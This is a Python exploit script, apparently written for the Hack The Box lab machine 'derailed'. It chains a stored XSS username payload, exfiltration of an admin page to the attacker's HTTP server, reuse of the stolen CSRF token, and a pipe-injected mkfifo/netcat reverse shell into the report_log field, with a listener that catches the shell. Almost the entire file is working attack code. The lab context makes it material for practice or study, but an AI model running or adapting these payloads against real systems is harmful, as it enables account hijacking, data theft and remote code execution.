#!/usr/bin/python3
import requests
import threading
import base64
import sys
import re
from colorama import Fore
from time import sleep
from http.server import BaseHTTPRequestHandler, HTTPServer
from bs4 import BeautifulSoup
from pwn import *

reverse_shell = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {local_ip} {local_port} >/tmp/f"

js_payload_rev_shell = """var xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", "http://derailed.htb:3000/administration", true);
xmlHttp.send( null );

setTimeout(function() {{
    var doc = new DOMParser().parseFromString(xmlHttp.responseText, 'text/html');
    var form = doc.querySelector('form');
    var token = form.querySelector('#authenticity_token').value;

    var newForm = document.createElement('form');
    newForm.method = 'post';
    newForm.action = '/administration/reports';

    var authenticityTokenInput = document.createElement('input');
    authenticityTokenInput.type = 'hidden';
    authenticityTokenInput.name = 'authenticity_token';
    authenticityTokenInput.value = token;
    newForm.appendChild(authenticityTokenInput);

    var reportLogInput = document.createElement('input');
    reportLogInput.type = 'text';
    reportLogInput.name = 'report_log';
    reportLogInput.value = '|{boom}';
    reportLogInput.hidden = true;
    newForm.appendChild(reportLogInput);

    var submitButton = document.createElement('button');
    submitButton.type = 'submit';
    submitButton.innerText = 'Submit';
    newForm.appendChild(submitButton);

    document.body.appendChild(newForm);
    newForm.submit();
}}, 5000);"""

xss_payload_base = """aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<select<style/>W<xmp<script><img src='x' onerror="eval(String.fromCharCode({payload}))"></script>"""

js_payload = """var request = new XMLHttpRequest();
request.onreadystatechange = function() {{
    if (request.readyState == XMLHttpRequest.DONE) {{
        fetch("http://{local_http_ip}/yo?" + encodeURI(btoa(request.responseText)))
    }}
}};
request.open('GET', "http://derailed.htb:3000{file_name}");
request.send(null);"""

class MyHttpHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return

    def do_GET(self):
        if '/yo' in self.path:
            try:
                value = self.path.split("?")[1]
                value = value.split(" ")[0]            

                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(b"OK !")

                threading.Thread(target=parse_yo_response, args=(value,)).start()
                self.server.shutdown()

            except Exception as e:
                print("[-] Failed to get base64 value in xss callback")

def parse_yo_response(base64_string:str):
    decoded_bytes = base64.b64decode(base64_string)
    decoded_string = decoded_bytes.decode('utf-8')
    # print(f"{Fore.GREEN}[+] Blob:\n{decoded_string}")

    if "undefined" == decoded_string:
        print(f"[-] XSS content is irregular. Check the xss payload. Quitting.")
        exit()

    soup = BeautifulSoup(decoded_string, 'html.parser')
    auth_token_input = soup.find('input', {'name': 'authenticity_token'})
    auth_token_value = auth_token_input['value']
    report_log_input = soup.find('input', {'name': 'report_log'})
    report_log = report_log_input['value']
    action = soup.find('form')['action']
    print(f"[+] Got admin authenticity_token: {auth_token_value}")
    print(f"[+] Got report log file name: {report_log}")
    print(f"[+] Starting second payload flow")
    session2 = requests.Session()

    rev = reverse_shell.format(local_ip = local_http_ip, local_port = local_port)
    payload2 = js_payload_rev_shell.format(boom=rev, authenticity_token=auth_token_value, report_log=report_log)
    charcode_array2 = [ord(char) for char in payload2]
    result2 = ",".join(str(charcode) for charcode in charcode_array2)
    newpayload = xss_payload_base.format(payload=result2)
    
    is_ok = register_with_payload(session2, newpayload)
    if not is_ok: exit()

    is_ok = login_with_payload(session2, newpayload)    
    if not is_ok: exit()

    note_id = create_note(session2)
    if not note_id: exit()

    report_a_note(session2, note_id)
    print(f"[+] Second payload sent to administartor. Wait for reverse shell on port [{local_port}]")

    start_callback_server()

def initiate_call_back():
    print(f"[+] Starting reverse shell listener on port [{local_port}] in 4..3..2..1")
    l = listen(int(local_port))
    conn = l.wait_for_connection()
    conn.interactive()

def start_callback_server():
    t = threading.Thread(target=initiate_call_back)
    t.start()

def start_http_server():
    with HTTPServer(("", 80), MyHttpHandler) as server:
        server.serve_forever()

def init_http_server():
    print("[+] Starting http server")
    thread = threading.Thread(target=start_http_server)
    thread.start()

def register_with_payload(thissession, username:str="") -> bool:
    url = "http://derailed.htb:3000/register"
    cookies = {"_simple_rails_session": "x7%2BZpyfVARzw5P9TUbX7gwqL37HEQDRiHU56jRLlV3Qs5n%2F7U5hVbwP5qJRN%2BQfw9XJMAswbhuVLoTgjrGdF9bAlF1S1OKBRjSX%2FSay9NGEEiGOg0h4NZO7M%2FOB45%2BMX8otYulBlRsbfpqUQpQXtVlTi3hlg%2BEVHsSG%2FfZ3RB8WbEbJ2l6I%2Fl9bT61lgyjgCVbUt2Cb6HBY5QLnEWd2N68M8jYeJp7r6AsKwBVt4eHZ7%2B8QXv9%2FhNeSM%2FqOI8PSFBL%2FwmoM459aHu2D0vvrxTFocJRNnUdY2IcdEjS4%3D--XN5cgdDVIHEI0l7w--ns2Xs%2FLMdLdlu4Kv7WXb4w%3D%3D"}
    data = {"authenticity_token": "8qIVjRuQKcTd6lPd3mRTFJXEqsHmpIi_VYFX1MSkLYL-Do2i71AmaxUkNFHsXRYVT5uZ37HsI7zhxoyHRq3oIA", "user[username]": username, "user[password]": "password123", "user[password_confirmation]": "password123"}
    response = thissession.post(url, cookies=cookies, data=data)

    if response.status_code == 200:
        print("[+] Successfully registered")
        return True
    else:
        return False

def login_with_payload(thissession, username:str) -> bool:

    url = "http://derailed.htb:3000/login"
    data = {"authenticity_token": "NzE6f8WETYZdeCEdatGXsaAvLb8Z1i2cBGLD-AhiKhUH2B5rMTVKvMTS71qTC6xf7zoq1sUTqYRGeyV1zJk4sg", "session[username]": username, "session[password]": "password123", "button": ''}
    response = thissession.post(url, data=data)

    if response.status_code == 200:
        print(f"[+] Successfully logged in with username [{username}]")
        return True
    else:
        return False

def extract_number_from_response(response:str) -> int:
    pattern = r'/clipnotes/(\d+)'
    match = re.search(pattern, response)
    if match:
        number = match.group(1)
        return number
    else:
        return None

def create_note(thissession):
    url = "http://derailed.htb:3000/create"
    data = {"authenticity_token": "PRdPFt53MUFT4uJB1AUfVe8kgQ_DKKId_Q4fniTO9kMngAozJShO9gtOzvS3LhytINkwqWW-NsInP9a39v5qDA", "note[content]": "a", "button": ''}
    response = thissession.post(url, data=data, allow_redirects=False)

    if response.status_code == 302:
        print("[+] Successfully created note")
    else:
        print("[+] Failed creating note")
        exit()
    
    return extract_number_from_response(response.text)

def report_a_note(thissession, this_note_id):
    burp0_url = f"http://derailed.htb:3000/report/{note_id}"
    response = thissession.get(burp0_url)

    if response.status_code == 200:
        print("[+] Got to report page")
    else:
        print("[+] Failed to get report page")
        exit()


    soup = BeautifulSoup(response.text, 'html.parser')
    auth_token_input = soup.find('input', {'name': 'authenticity_token'})
    auth_token_value = auth_token_input['value']

    url = "http://derailed.htb:3000/report"
    headers = {"Referer": f"http://derailed.htb:3000/report/{this_note_id}", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://derailed.htb:3000", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
    data = {"authenticity_token": auth_token_value, "report[reason]": "anything", "report[note_id]": this_note_id}
    response = thissession.post(url, headers=headers, data=data)
    
    if response.status_code == 200:
        print("[+] Payload sent to administrator. Please wait. Be patient...")

if __name__ == "__main__":

    if len(sys.argv) < 2:
        print(f"{Fore.RED}[-] You forgot sending local ip and local port for reverse shell callback")
        exit()

    session = requests.Session()
    local_http_ip = sys.argv[1]
    local_port = sys.argv[2]
    filename = "/administration"
    
    payload = js_payload.format(local_http_ip=local_http_ip, file_name=filename)
    charcode_array = [ord(char) for char in payload]
    result = ",".join(str(charcode) for charcode in charcode_array)
    username_payload = xss_payload_base.format(payload=result)

    init_http_server()
    sleep(1)
    is_ok = register_with_payload(session, username_payload)
    if not is_ok: exit()

    is_ok = login_with_payload(session, username_payload)    
    if not is_ok: exit()

    note_id = create_note(session)
    if not note_id: exit()

    report_a_note(session, note_id)


